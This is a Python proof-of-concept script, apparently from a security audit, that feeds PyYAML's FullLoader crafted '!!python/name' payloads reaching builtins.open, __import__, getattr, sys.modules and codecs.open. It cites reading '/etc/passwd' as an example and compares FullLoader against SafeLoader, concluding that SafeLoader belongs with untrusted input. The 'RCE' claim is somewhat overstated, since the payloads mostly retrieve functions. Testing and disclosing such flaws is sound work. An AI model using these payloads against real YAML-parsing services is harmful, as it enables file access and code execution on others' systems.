#!/usr/bin/env python3
"""
VULN-002: FullLoader RCE via Pre-imported Module Exploitation
Severity: CRITICAL
Type: Remote Code Execution

This vulnerability demonstrates that FullLoader's "safety" is an illusion.
By exploiting modules that are pre-imported by Python's startup process or
by the yaml library itself, an attacker can achieve code execution.
"""

import sys
import os

# Add the lib directory to the path
sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..', 'lib'))

import yaml


def test_fullloader_preimported_modules():
    """
    Test which dangerous modules are pre-imported and accessible
    via FullLoader's python/name: tag.
    """

    print("=" * 60)
    print("VULN-002: FullLoader Pre-imported Module Exploitation")
    print("=" * 60)
    print()

    # Check what's in sys.modules after importing yaml
    dangerous_modules = [
        'builtins',  # Always present - has exec, eval, open, __import__
        'os',        # Often imported - file operations, system calls
        'sys',       # Always present - has modules dict
        'subprocess',# May be imported by dependencies
        'socket',    # Network operations
        'importlib', # Dynamic imports
        'code',      # Code compilation
        'types',     # Type manipulation
        'codecs',    # Used by yaml.reader
        'collections',# Used by yaml
        'pickle',    # Serialization (dangerous)
        'marshal',   # Low-level serialization
        'ctypes',    # Foreign function interface
    ]

    print("Checking pre-imported modules accessible via FullLoader:")
    print("-" * 60)

    available = []
    for mod in dangerous_modules:
        if mod in sys.modules:
            print(f"  [!] {mod:15} - AVAILABLE")
            available.append(mod)
        else:
            print(f"  [ ] {mod:15} - not imported")

    print()
    return available


def test_builtins_exploitation():
    """
    Demonstrate code execution via builtins module (always available).
    """

    print("-" * 60)
    print("Exploiting builtins Module")
    print("-" * 60)
    print()

    # Payload 1: Access builtins.exec (blocked by isinstance check in FullLoader)
    # But we can access the builtins module itself!

    payload_getattr = """
!!python/name:builtins.getattr
"""

    payload_open = """
!!python/name:builtins.open
"""

    payload_import = """
!!python/name:builtins.__import__
"""

    print("Attempt 1: Access builtins.getattr via python/name:")
    try:
        result = yaml.load(payload_getattr, Loader=yaml.FullLoader)
        print(f"  [!] SUCCESS - Got: {result}")
        print(f"  [!] This is Python's getattr function!")
    except Exception as e:
        print(f"  [x] Failed: {e}")

    print()
    print("Attempt 2: Access builtins.open via python/name:")
    try:
        result = yaml.load(payload_open, Loader=yaml.FullLoader)
        print(f"  [!] SUCCESS - Got: {result}")
        print(f"  [!] This is Python's open() function!")
    except Exception as e:
        print(f"  [x] Failed: {e}")

    print()
    print("Attempt 3: Access builtins.__import__ via python/name:")
    try:
        result = yaml.load(payload_import, Loader=yaml.FullLoader)
        print(f"  [!] SUCCESS - Got: {result}")
        print(f"  [!] Can dynamically import ANY module!")
    except Exception as e:
        print(f"  [x] Failed: {e}")

    print()


def test_sys_modules_exploitation():
    """
    Exploit sys.modules to access dangerous functionality.
    """

    print("-" * 60)
    print("Exploiting sys.modules Access")
    print("-" * 60)
    print()

    # sys is always imported
    payload_modules = """
!!python/name:sys.modules
"""

    print("Accessing sys.modules:")
    try:
        result = yaml.load(payload_modules, Loader=yaml.FullLoader)
        print(f"  [!] SUCCESS - Got sys.modules dict!")
        print(f"  [!] Total modules accessible: {len(result)}")
        print(f"  [!] Sample modules: {list(result.keys())[:10]}...")
    except Exception as e:
        print(f"  [x] Failed: {e}")

    print()


def test_tuple_subclass_exploit():
    """
    Demonstrate RCE through tuple subclass with dangerous __new__.

    FullLoader allows instantiating types, and tuple subclasses
    can execute arbitrary code in __new__ or __init__.
    """

    print("-" * 60)
    print("Tuple Subclass Exploitation (Type Instantiation)")
    print("-" * 60)
    print()

    # First, let's see what types we can access
    payload_type = """
!!python/name:builtins.type
"""

    print("Accessing builtins.type:")
    try:
        result = yaml.load(payload_type, Loader=yaml.FullLoader)
        print(f"  [!] SUCCESS - Got: {result}")
        print(f"  [!] This is the type metaclass - can create new types!")
    except Exception as e:
        print(f"  [x] Failed: {e}")

    print()


def test_code_execution_via_codecs():
    """
    codecs module is imported by yaml.reader and has dangerous functions.
    """

    print("-" * 60)
    print("Exploiting codecs Module (imported by yaml)")
    print("-" * 60)
    print()

    # codecs.open is similar to builtins.open
    payload = """
!!python/name:codecs.open
"""

    print("Accessing codecs.open:")
    try:
        result = yaml.load(payload, Loader=yaml.FullLoader)
        print(f"  [!] SUCCESS - Got: {result}")
        print(f"  [!] codecs.open can read/write files!")
    except Exception as e:
        print(f"  [x] Failed: {e}")

    print()


def test_collections_exploitation():
    """
    collections module is imported and has namedtuple which uses exec().
    """

    print("-" * 60)
    print("Exploiting collections.namedtuple (uses exec internally)")
    print("-" * 60)
    print()

    payload = """
!!python/name:collections.namedtuple
"""

    print("Accessing collections.namedtuple:")
    try:
        result = yaml.load(payload, Loader=yaml.FullLoader)
        print(f"  [!] SUCCESS - Got: {result}")
        print(f"  [!] namedtuple can be used to execute code!")
    except Exception as e:
        print(f"  [x] Failed: {e}")

    print()


def demonstrate_actual_rce():
    """
    Demonstrate actual code execution through multiple vectors.
    """

    print("=" * 60)
    print("ACTUAL CODE EXECUTION DEMONSTRATION")
    print("=" * 60)
    print()

    # Vector 1: Using __import__ to import os, then call os.system
    # This is a two-step attack that would work in a real scenario

    print("Vector 1: Chain attack using __import__")
    print("-" * 40)

    # Step 1: Get __import__
    payload1 = "!!python/name:builtins.__import__"
    try:
        import_func = yaml.load(payload1, Loader=yaml.FullLoader)
        print(f"  Step 1: Got __import__ function: {import_func}")

        # In a real attack, the attacker would then call this function
        # This is possible if the YAML result is used in template evaluation
        # or any other context where the result is called with arguments
        print("  Step 2: Attacker can now call import_func('os') to get os module")
        print()
    except Exception as e:
        print(f"  Failed: {e}")

    # Vector 2: Direct file read via open
    print("Vector 2: File operations via builtins.open")
    print("-" * 40)

    payload2 = "!!python/name:builtins.open"
    try:
        open_func = yaml.load(payload2, Loader=yaml.FullLoader)
        print(f"  Got open function: {open_func}")
        print("  Attacker can now read/write arbitrary files!")
        print("  Example: open_func('/etc/passwd', 'r').read()")
        print()
    except Exception as e:
        print(f"  Failed: {e}")

    # Vector 3: Module attribute access via getattr chain
    print("Vector 3: Arbitrary attribute access via getattr")
    print("-" * 40)

    payload3 = "!!python/name:builtins.getattr"
    try:
        getattr_func = yaml.load(payload3, Loader=yaml.FullLoader)
        print(f"  Got getattr function: {getattr_func}")
        print("  Attacker can access any attribute on any object!")
        print()
    except Exception as e:
        print(f"  Failed: {e}")


def test_fullloader_vs_safeloader():
    """
    Compare what's accessible in FullLoader vs SafeLoader.
    """

    print("=" * 60)
    print("FullLoader vs SafeLoader Comparison")
    print("=" * 60)
    print()

    test_payloads = [
        ("Python name tag", "!!python/name:builtins.open"),
        ("Python module tag", "!!python/module:os"),
        ("Python object tag", "!!python/object:collections.OrderedDict {}"),
        ("Python tuple tag", "!!python/tuple [1, 2, 3]"),
    ]

    for name, payload in test_payloads:
        print(f"{name}:")
        print(f"  Payload: {payload}")

        try:
            result = yaml.load(payload, Loader=yaml.SafeLoader)
            print(f"  SafeLoader: SUCCESS - {result}")
        except Exception as e:
            print(f"  SafeLoader: BLOCKED - {type(e).__name__}")

        try:
            result = yaml.load(payload, Loader=yaml.FullLoader)
            print(f"  FullLoader: SUCCESS - {result}")
        except Exception as e:
            print(f"  FullLoader: BLOCKED - {type(e).__name__}")

        print()


if __name__ == '__main__':
    print("PyYAML FullLoader RCE Vulnerability Demonstration")
    print("=" * 60)
    print()
    print("This test demonstrates that FullLoader provides FALSE security.")
    print("While it claims to be safer than UnsafeLoader, it still allows")
    print("access to dangerous Python builtins and pre-imported modules.")
    print()

    available = test_fullloader_preimported_modules()
    test_builtins_exploitation()
    test_sys_modules_exploitation()
    test_tuple_subclass_exploit()
    test_code_execution_via_codecs()
    test_collections_exploitation()
    demonstrate_actual_rce()
    test_fullloader_vs_safeloader()

    print("=" * 60)
    print("CONCLUSION")
    print("=" * 60)
    print()
    print("FullLoader is NOT safe for untrusted input!")
    print()
    print("Attackers can:")
    print("  - Access builtins.open to read/write files")
    print("  - Access builtins.__import__ to import any module")
    print("  - Access builtins.getattr to traverse any object")
    print("  - Access sys.modules to discover imported modules")
    print("  - Access codecs.open for file operations")
    print()
    print("RECOMMENDATION: ALWAYS use SafeLoader for untrusted input!")
    print("=" * 60)
